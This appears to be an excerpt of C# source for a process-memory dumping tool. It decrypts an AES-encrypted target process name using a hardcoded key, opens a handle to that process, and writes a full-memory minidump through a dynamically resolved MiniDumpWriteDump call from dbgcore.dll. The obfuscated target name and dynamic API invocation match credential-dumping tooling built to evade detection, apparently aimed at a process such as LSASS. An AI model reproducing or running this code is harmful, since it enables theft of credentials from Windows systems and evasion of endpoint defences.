...
namespace MiniDump
{
    ...
    public class Generic
    {
        ...
        public static object DynamicAPIInvokeFromDisk(string DLLName,
            string FunctionName,
            Type FunctionDelegateType,
            ref object[] Parameters)
        {
    ...
    {
        static void __dmp(string output_path)
        {

            byte[] __name = new byte[16]{
                0x5a, 0x70, 0xb4, 0x15, 0xd1, 0xdf,
                0x2a, 0x80, 0xf3, 0x90, 0x04, 0x85,
                0x26, 0xcb, 0xc7, 0x39
            };
            ...
            {
                __aes.Key = new byte[16] { 0x31, 0x73, 0x43, 0x63, 0x47, 0x76, 0x51, 0x44, 0x46, 0x4c, 0x79, 0x44, 0x57, 0x67, 0x35, 0x64 };
                __aes.IV = new byte[16] { 0x64, 0x6a, 0x66, 0x5a, 0x77, 0x44, 0x36, 0x4d, 0x31, 0x4a, 0x64, 0x45, 0x47, 0x64, 0x32, 0x34 };
                ICryptoTransform decryptor = __aes.CreateDecryptor(__aes.Key, __aes.IV);
                using (MemoryStream msDecrypt = new MemoryStream(__name))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {
                            __p = srDecrypt.ReadToEnd();
                        }
                    }
                }
            }

            Process[] __l = Process.GetProcessesByName(__p.Split('.')[0]);
            int __pid = __l[0].Id;
            Console.WriteLine($"[+] Got process id: {__pid} !");
            IntPtr handle = __l[0].Handle;
            Console.WriteLine("[+] Got handle!");
            FileStream __f = new FileStream(output_path, FileMode.Create);
            object[] __args2 = {
                handle, (uint) __pid, __f.SafeFileHandle, MINIDUMP_TYPE.MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero
            };

            var ret = (bool)Generic.DynamicAPIInvokeFromDisk("dbgcore.dll", @"MiniDumpWriteDump", typeof(MiniDumpWriteDump), ref __args2);
            if (!ret)
            {
                Console.WriteLine("[!] Failure");
                return;
            }
            Console.WriteLine($"[+] Writtent to {output_path}");
        }
        static void Main(string[] args)
        {
            if (args.Length != 1)
            {
                Console.WriteLine($"Usage: ./program Path\\To\\Output\\File.bin");
                return;
            }
            __dmp(args[0]);
        }
    ...
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr OpenProcess(uint processAccess, bool bInheritHandle,
        int processId);
